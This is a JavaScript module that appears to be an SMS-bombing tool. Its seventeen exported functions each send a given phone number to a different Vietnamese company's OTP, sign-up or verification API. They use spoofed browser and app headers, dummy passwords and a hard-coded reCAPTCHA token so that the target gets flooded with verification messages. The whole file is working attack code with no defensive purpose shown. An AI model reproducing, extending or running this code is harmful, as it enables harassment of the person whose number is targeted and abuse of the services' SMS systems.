const axios = require('axios');

async function myviettel(number) {
  try {
    const data = { msisdn: number.toString() };
    const resp = await axios({ url: 'https://vietteltelecom.vn/api/get-otp', method: 'post', data });
    console.log('MyViettel:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('MyViettel Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function TV360(number) {
  try {
    const data = { msisdn: number.toString() };
    const resp = await axios({ url: 'http://tv360.vn/public/v1/auth/get-otp-login', method: 'post', data });
    console.log('TV360:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('TV360 Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function zalopay(number) {
  try {
    const headers = {
      'Host': 'api.zalopay.vn',
      'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false ZaloPayWebClient/7.13.1',
      'x-device-model': 'iPhone8,2',
      'x-density': 'iphone12',
      'authorization': 'Bearer ',
      'x-device-os': 'IOS',
      'x-drsite': 'off',
      'accept': '*/*',
      'x-app-version': '7.13.1',
      'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
      'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
      'x-platform': 'NATIVE',
      'x-os-version': '14.6',
    };
    const params = { phone_number: number.toString() };
    const res = await axios({ url: 'https://api.zalopay.vn/v2/account/phone/status', method: 'get', headers, params });
    const token = res.data?.data?.send_otp_token;
    if (!token) throw new Error('No send_otp_token received');
    const res1 = await axios({
      url: 'https://api.zalopay.vn/v2/account/otp',
      method: 'post',
      headers,
      data: { phone_number: number.toString(), send_otp_token: token }
    });
    console.log('ZaloPay:', res1.data);
    return { success: true, data: res1.data };
  } catch (err) {
    console.error('ZaloPay Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function metavn(number) {
  try {
    const headers = {
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36'
    };
    const data = { api_args: { lgUser: number.toString(), act: 'send', type: 'phone' }, api_method: 'CheckExist' };
    const resp = await axios({ url: 'https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1', method: 'post', headers, data });
    console.log('MetaVN:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('MetaVN Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function vion(number) {
  try {
    const formdata = {
      phone_number: number.toString(),
      password: 'âbbcc',
      platform: 'web',
      model: 'Windows 10',
      device_name: 'Chrome/101',
      device_type: 'desktop',
      ui: '012021'
    };
    const resp = await axios({
      url: 'https://api.vieon.vn/backend/user/register/mobile?platform=web&ui=012021',
      method: 'post',
      data: new URLSearchParams(formdata)
    });
    console.log('Vion:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('Vion Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function fpt(number) {
  try {
    const data = { phone: number.toString(), typeReset: '0' };
    const headers = {
      'Accept': '*/*',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'vi;q=0.8',
      'Connection': 'keep-alive',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Host': 'fptshop.com.vn',
      'Origin': 'https://fptshop.com.vn',
      'Referer': 'https://fptshop.com.vn/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-GPC': '1',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
      'X-Requested-With': 'XMLHttpRequest'
    };
    const resp = await axios({ url: 'https://fptshop.com.vn/api-data/loyalty/Login/Verification', method: 'post', headers, data });
    console.log('FPT:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('FPT Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function fptplay(number) {
  try {
    const data = { phone: number.toString(), country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' };
    const resp = await axios({
      url: 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=8VXof1DwcEuwyF_zO7PvkA&e=1681313081&device=Chrome(version%253A101.0.0.0)&drm=1',
      method: 'post',
      data
    });
    console.log('FPTPlay:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('FPTPlay Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function hasuki(number) {
  try {
    const resp = await axios({ url: `https://hasaki.vn/ajax?api=user.verifyUserName&username=${number.toString()}`, method: 'get' });
    console.log('Hasuki:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('Hasuki Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function popeys(number) {
  try {
    const headers = {
      'accept': 'application/json',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi;q=0.7',
      'content-type': 'application/json',
      'origin': 'https://popeyes.vn',
      'referer': 'https://popeyes.vn/',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'sec-gpc': '1',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
      'x-client': 'WebApp'
    };
    const data = { phone: number.toString(), firstName: 'Hoang', lastName: 'Kien', email: 'halizeks@gmail.com' };
    const resp = await axios({ url: 'https://api.popeyes.vn/api/v1/register', method: 'post', headers, data });
    console.log('Popeys:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('Popeys Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function atm(number) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi;q=0.9',
      'content-type': 'application/json',
      'origin': 'https://atm-online.vn',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'sec-gpc': '1',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
    };
    const data = { mobilePhone: number.toString(), source: 'ONLINE' };
    const resp = await axios({ url: 'https://atm-online.vn/back-office/api/json/auth/sendAcceptanceCode', method: 'post', headers, data });
    console.log('ATM:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('ATM Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function mochalazi(number) {
  try {
    const data = { countryCode: '84', phoneNumber: number.toString() };
    const resp = await axios({ url: 'https://mocha.lozi.vn/v1/invites/use-app', method: 'post', data });
    console.log('MochaLazi:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('MochaLazi Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function interloan(number) {
  try {
    const resp = await axios.post('https://backend.interloan.tech/api/v1/users/phone_check', {
      phone: number.toString(),
      user_type: 'borrower'
    });
    console.log('Interloan:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('Interloan Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function winmart(number) {
  try {
    const resp = await axios.get(`https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=${number.toString()}`);
    console.log('Winmart:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('Winmart Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function pharmacity(number) {
  try {
    const resp = await axios.post('https://api-gateway.pharmacity.vn/customers/register/otp', {
      phone: number.toString(),
      referral: ''
    });
    console.log('Pharmacity:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('Pharmacity Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function gosell(number) {
  try {
    const resp = await axios.post('https://api.beecow.com/api/register/gosell', {
      password: '7749Truong.',
      displayName: '',
      locationCode: 'VN-SG',
      langKey: 'vi',
      mobile: { countryCode: '+84', phoneNumber: number.toString() }
    });
    console.log('Gosell:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('Gosell Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function gapo(number) {
  try {
    const resp = await axios.post('https://api.gapo.vn/auth/v2.0/signup', {
      device_id: '02d0db76-9cd9-49a0-9456-0e374dfb0c21',
      phone_number: `+84-${number.toString()}`,
      otp_type: 0
    });
    console.log('Gapo:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('Gapo Error:', err.message);
    return { success: false, error: err.message };
  }
}

async function f88(number) {
  try {
    const headers = {
      'Host': 'api.f88.vn',
      'content-type': 'application/json',
      'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
      'accept': '*/*',
      'origin': 'https://online.f88.vn',
      'sec-fetch-site': 'same-site',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://online.f88.vn/',
      'accept-encoding': 'gzip, deflate, br'
    };
    const data = {
      phoneNumber: number.toString(),
      recaptchaResponse: '03AKH6MRGETJqRxQjNsEopTQ5aKVDyBPYI2YBd6aJXCCKe_X0cM7UYaDU4gHCquF0VFGHb26CVhQdLyNJFkuD3JvJbKDgMBoTTGLG9lY71LKUwwYO4G1UxMx7oUGF6ImmE1gQTUFjEyW488rHvGEPUmCip0Y2laolYL0gFeGFdrOxFfFDf6iphqwg6jsSK3bnK2ZxDw7vsKf0fjPVkd-Q2un_jRnEOqSDO3h6bhN9YVvE3-lLwLrb9IYLKMhEf59FNYf8qLnA8BM2vFXUEZfu5Ghi7qFzwbYIqVJCFpvA-TTcC7NnzuWm0u2-9cy0EAG-01WxiCKtrHaLQ2z2_pTByu_XNKN5ma86srG7EpUpeEmnNHIBEw0eeHiSG93pJOzSQbV2UkltEm7Fkcg53jcnVkGUKgsXgvp63YEcRLPmx6G44pYtC_xz4TUImH1IMCgPhR-jgKbtp6_tOpqqCsnCkUdez0nbWyhUSWdXHoqzyfXMn8sV7LCy5cLxm3z0lAz9m8EeMmfusRcbF',
      source: 'Online'
    };
    const resp = await axios({ url: 'https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP', method: 'post', data, headers });
    console.log('F88:', resp.data);
    return { success: true, data: resp.data };
  } catch (err) {
    console.error('F88 Error:', err.message);
    return { success: false, error: err.message };
  }
}

module.exports = {
  myviettel,
  TV360,
  zalopay,
  metavn,
  vion,
  fpt,
  fptplay,
  hasuki,
  popeys,
  atm,
  mochalazi,
  interloan,
  winmart,
  pharmacity,
  gosell,
  gapo,
  f88
};
